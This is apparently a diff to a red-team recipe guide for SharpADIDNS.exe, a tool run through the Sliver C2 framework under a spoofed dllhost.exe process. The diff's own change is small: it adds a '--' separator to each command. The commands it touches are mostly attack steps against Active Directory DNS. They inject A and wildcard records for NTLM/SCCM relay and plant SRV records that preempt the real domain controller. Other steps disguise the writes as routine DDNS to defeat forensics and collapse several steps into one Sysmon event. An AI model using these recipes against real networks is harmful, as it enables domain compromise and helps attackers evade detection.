@@ -18,7 +18,7 @@ Bring your own values; substitute everywhere.
 
 ### Argument syntax shortcuts
 
-Two flag forms are accepted: `--flag value` (space-separated, used throughout the recipes) and `--flag=value` (equals form). The equals form is more robust through multi-layer shell parsing (Sliver `execute-assembly`, scripted ssh, etc.) when the value contains spaces, quotes, or `$`. Mixing is fine: `--username=corp\u --password-base64 UmVk...` works.
+Two flag forms are accepted: `--flag value` (space-separated, used throughout the recipes) and `--flag=value` (equals form). The equals form is more robust through multi-layer shell parsing (Sliver `execute-assembly`, scripted ssh, etc.) when the value contains spaces, quotes, or `$`. Mixing is fine: `--username=redteamnotes\u --password-base64 UmVk...` works.
 
 Per-verb help is also available: `SharpADIDNS.exe add --help` shows only the flags relevant to `add`; `enum --help` only the enum-relevant subset; etc. Global `--help` (no verb) prints the full reference.
 
@@ -29,7 +29,7 @@ Per-verb help is also available: `SharpADIDNS.exe add --help` shows only the fla
 **Goal**: understand the AD-DNS environment before any write. Identify zones, interesting hostnames, ownership patterns. Read-only — no AD writes, no disk artifacts.
 
 ```bash
-sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe \
+sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe -- \
     --c2 --username "$USER" --password-base64 "$PWB64" \
     --dn "$DN" --server "$DC" \
     --script "
@@ -61,7 +61,7 @@ Look for:
 **Goal**: add one A record (e.g. for an SCCM relay or NTLM relay setup), capture pre-state in the receipt so you can revert.
 
 ```bash
-sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe \
+sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe -- \
     --c2 --username "$USER" --password-base64 "$PWB64" \
     --dn "$DN" --server "$DC" \
     add --zone "$ZONE" --name sccm --type A --data 10.0.0.66
@@ -84,7 +84,7 @@ The receipt's `reverse` field is your one-line undo for the create case:
 When you want to clean up:
 
 ```bash
-sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe \
+sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe -- \
     --c2 --username "$USER" --password-base64 "$PWB64" \
     remove --zone $ZONE --name sccm --dn $DN --server $DC
 ```
@@ -98,7 +98,7 @@ Note that `reverse` deliberately omits `--username`/`--password*` — re-add you
 **Goal**: same as recipe 2, but tune the resulting `dnsRecord` blob and object owner to look like a routine DDNS write, defeating two common forensic patterns.
 
 ```bash
-sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe \
+sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe -- \
     --c2 --username "$USER" --password-base64 "$PWB64" \
     --dn "$DN" --server "$DC" \
     add --zone "$ZONE" --name sccm --type A --data 10.0.0.66 \
@@ -116,7 +116,7 @@ What's different from recipe 2:
 Verify after the write:
 
 ```bash
-sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe \
+sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe -- \
     --c2 --username "$USER" --password-base64 "$PWB64" \
     --dn "$DN" --server "$DC" \
     query --zone "$ZONE" --name sccm
@@ -138,13 +138,13 @@ Confirm in the JSON receipt:
 
 ```bash
 # pre-check: does a wildcard already exist?
-sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe \
+sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe -- \
     --c2 --username "$USER" --password-base64 "$PWB64" \
     --dn "$DN" --server "$DC" \
     enum --zone "$ZONE" --filter-name '\*'
 
 # inject (only if pre-check returned 0 nodes)
-sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe \
+sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe -- \
     --c2 --username "$USER" --password-base64 "$PWB64" \
     --dn "$DN" --server "$DC" \
     add --zone "$ZONE" --name "*" --type A --data 10.0.0.66 \
@@ -156,7 +156,7 @@ sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe \
 Cleanup:
 
 ```bash
-sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe \
+sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe -- \
     --c2 --username "$USER" --password-base64 "$PWB64" \
     remove --zone $ZONE --name "*" --dn $DN --server $DC
 ```
@@ -172,7 +172,7 @@ Run recipe 1 again to confirm the wildcard is gone.
 The classic target is `_ldap._tcp.dc._msdcs.<zone>` (where DCs advertise themselves). A new SRV with `priority 0 weight 100 port 389` will preempt the legitimate DC if your weight beats theirs, or coexist as a candidate.
 
 ```bash
-sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe \
+sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe -- \
     --c2 --username "$USER" --password-base64 "$PWB64" \
     --dn "$DN" --server "$DC" \
     add --zone "$ZONE" --name '_ldap._tcp.dc._msdcs' --type SRV \
@@ -186,7 +186,7 @@ sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe \
 To verify all SRV entries on the node afterwards:
 
 ```bash
-sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe \
+sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe -- \
     --c2 --username "$USER" --password-base64 "$PWB64" \
     --dn "$DN" --server "$DC" \
     query --zone "$ZONE" --name '_ldap._tcp.dc._msdcs'
@@ -218,7 +218,7 @@ This is multi-step on purpose; the tool's `reverse` field is `null` for `add --a
 **Goal**: do a 3-step operation (verify pre-state → modify → verify post-state) in a single `execute-assembly` invocation, so it shows up as **one** Sysmon EID 1 instead of three.
 
 ```bash
-sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe \
+sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe -- \
     --c2 --username "$USER" --password-base64 "$PWB64" \
     --zone "$ZONE" --dn "$DN" --server "$DC" \
     --script "
@@ -277,7 +277,7 @@ For an entirely in-memory equivalent without `ops.jsonl` on disk, you'd have to 
 **Goal**: before attempting a `--force` replace or `remove`, confirm you have write rights on the target node — without actually doing the write.
 
 ```bash
-sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe \
+sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe -- \
     --c2 --username "$USER" --password-base64 "$PWB64" \
     --dn "$DN" --server "$DC" \
     query --zone "$ZONE" --name fileserver -v
